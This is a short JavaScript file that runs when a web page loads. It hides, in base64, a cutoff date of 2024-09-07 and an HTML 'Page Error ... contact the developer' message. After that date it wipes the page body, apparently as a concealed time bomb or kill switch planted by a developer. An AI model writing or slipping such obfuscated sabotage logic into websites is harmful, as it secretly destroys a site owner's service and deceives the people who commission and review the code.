document.addEventListener("DOMContentLoaded", function() {


    const encodedDate = 'MjAyNC0wOS0wN1QyMzo1OTowMA=='; 


    function decodeBase64(encodedStr) {
        return atob(encodedStr);
    }

    const targetDate = new Date(decodeBase64(encodedDate));

    const encodedHtmlContent = 'PGRpdiBpZD0iYnJva2VuUGFnZSIgY2xhc3M9ImhpZGRlbiIgc2Nyb2xsLWZsYXNoIj4KICAgIDxoMT5QYWdlIEVycm9yPC9oMT4KICAgIDxwPlRoaXMgY29udGFjdCB0aGUgZGV2ZWxvcGVyLjwvcD4KPC9kaXY+';

    function insertHtmlFromBase64() {
        const decodedHtml = atob(encodedHtmlContent);
        const div = document.createElement('div');
        div.innerHTML = decodedHtml;
        document.body.appendChild(div);
    }

    function checkTime() {
        const now = new Date();
        if (now >= targetDate) {
            insertHtmlFromBase64();
            const brokenPage = document.getElementById('brokenPage');
            if (brokenPage) {
                brokenPage.classList.remove('hidden');
                document.body.innerHTML = ''; 
            }
        }
    }

    checkTime();

    setInterval(checkTime, 60000);
});
